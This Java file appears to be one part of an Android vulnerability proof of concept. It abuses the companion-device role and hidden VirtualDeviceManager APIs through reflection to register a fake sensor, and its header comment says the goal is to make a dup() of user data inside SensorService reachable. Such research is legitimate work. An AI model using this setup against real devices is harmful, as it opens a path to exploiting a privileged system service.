package com.example.thisseemswrong;

import android.companion.AssociationInfo;
import android.companion.virtual.VirtualDeviceManager;
import android.content.AttributionSource;
import android.content.Context;
import android.content.ContextWrapper;
import android.hardware.Sensor;
import android.os.ConditionVariable;
import android.os.IBinder;
import android.os.Process;
import android.system.Os;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.List;
import java.util.concurrent.Executor;

/*
 This class allows creating VirtualDevice sensor
 in order to make dup(data_from_user) within SensorService reachable
 https://cs.android.com/android/platform/superproject/main/+/main:frameworks/native/services/sensorservice/SensorService.cpp;l=1719;drc=beb0dff35c999f86a6a495038bd8e7f0a07378da

 On first run com.android.shell will be assigned COMPANION_DEVICE_APP_STREAMING role

 adb shell 'CLASSPATH=$(pm path com.example.thisseemswrong | cut -d: -f2) app_process / com.example.thisseemswrong.VirtualDeviceReg'
 */
public class VirtualDeviceReg {
    static List<AssociationInfo> getAssociations() throws IllegalAccessException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException {
        Object service = Class.forName("android.companion.ICompanionDeviceManager$Stub")
                .getMethod("asInterface", IBinder.class)
                .invoke(null, Class.forName("android.os.ServiceManager").getMethod("getService", String.class).invoke(null, Context.COMPANION_DEVICE_SERVICE));
        List<AssociationInfo> associationInfos = (List<AssociationInfo>) service.getClass().getMethod("getAllAssociationsForUser", int.class).invoke(service, 0);
        return associationInfos;
    }

    static AssociationInfo getAssociation() throws Exception {
        List<AssociationInfo> associationInfos = getAssociations();
        Method belongsToPackage = AssociationInfo.class.getMethod("belongsToPackage", int.class, String.class);
        for (AssociationInfo associationInfo : associationInfos) {
            if (
                    "android.app.role.COMPANION_DEVICE_APP_STREAMING".equals(associationInfo.getDeviceProfile()) &&
                            (boolean) belongsToPackage.invoke(associationInfo, 0, "com.android.shell")) {
                return associationInfo;
            }
        }
        return null;
    }

    public static void main(String[] args) throws Exception {
        System.out.println("VirtualDevice registration");

        if (Process.myUid() == 0) {
            Os.setuid(2000);
        }

        AssociationInfo association = getAssociation();
        if (association == null) {
            new ProcessBuilder(
                    "cmd",
                    "companiondevice",
                    "associate",
                    "0",
                    "com.android.shell",
                    "00:00:00:00:00:00",
                    "android.app.role.COMPANION_DEVICE_APP_STREAMING"
            ).start().waitFor();
            Thread.sleep(500);
            association = getAssociation();
            if (association == null) {
                System.out.println("Failed to create association, present associations:");
                System.out.println(getAssociations());
                return;
            }
            System.out.println("Created association: " + association);
        } else {
            System.out.println("Using previously created association: " + association);
        }

        Class<?> builderClass = Class.forName("android.companion.virtual.VirtualDeviceParams$Builder");
        Object builder = builderClass.newInstance();

        // builder.setDevicePolicy(POLICY_TYPE_SENSORS, DEVICE_POLICY_CUSTOM)
        builderClass
                .getMethod("setDevicePolicy", int.class, int.class)
                .invoke(builder, 0, 1);

        // builder.setVirtualSensorCallback(Runnable::run, () -> {})
        {
            Class<?> callbackClass = Class.forName("android.companion.virtual.sensor.VirtualSensorCallback");
            builderClass
                    .getMethod(
                            "setVirtualSensorCallback",
                            Executor.class,
                            callbackClass
                    ).invoke(
                            builder,
                            (Executor) Runnable::run,
                            Proxy.newProxyInstance(VirtualDeviceReg.class.getClassLoader(), new Class[]{callbackClass}, (proxy, method, args1) -> null)
                    );
        }

        // builder.addVirtualSensorConfig(new VirtualSensorConfig.Builder(Sensor.TYPE_ACCELEROMETER, "ThisSeemsWrong-MockSensor").build())
        Class<?> sensorBuilderClass = Class.forName("android.companion.virtual.sensor.VirtualSensorConfig$Builder");
        Object sensorBuilder = sensorBuilderClass.getConstructor(int.class, String.class)
                .newInstance(Sensor.TYPE_ACCELEROMETER, "ThisSeemsWrong-MockSensor");
        builderClass.getMethod("addVirtualSensorConfig", Class.forName("android.companion.virtual.sensor.VirtualSensorConfig"))
                .invoke(builder, sensorBuilderClass.getMethod("build").invoke(sensorBuilder));

        // vdm = new VirtualDeviceManager(...)
        VirtualDeviceManager vdm = VirtualDeviceManager.class.getConstructor(
                Class.forName("android.companion.virtual.IVirtualDeviceManager"),
                Context.class
        ).newInstance(
                Class.forName("android.companion.virtual.IVirtualDeviceManager$Stub")
                        .getMethod("asInterface", IBinder.class)
                        .invoke(null, Class.forName("android.os.ServiceManager").getMethod("getService", String.class).invoke(null, Context.VIRTUAL_DEVICE_SERVICE)),
                new ContextWrapper(null) {
                    @Override
                    public Context getApplicationContext() {
                        return this;
                    }

                    @NonNull
                    @Override
                    public AttributionSource getAttributionSource() {
                        return new AttributionSource.Builder(Process.myUid()).setPackageName("com.android.shell").build();
                    }
                }
        );

        // vd = vdm.createVirtualDevice(association.getId(), builder.build())
        Object vd = VirtualDeviceManager.class
                .getMethod("createVirtualDevice", int.class, Class.forName("android.companion.virtual.VirtualDeviceParams"))
                .invoke(vdm, association.getId(), builderClass.getMethod("build").invoke(builder));
        System.out.println("Created VirtualDevice, getDeviceId()=" + vd.getClass().getMethod("getDeviceId").invoke(vd));

        System.out.println("Now just waiting, ^C to remove this device");
        new ConditionVariable().block();
    }
}
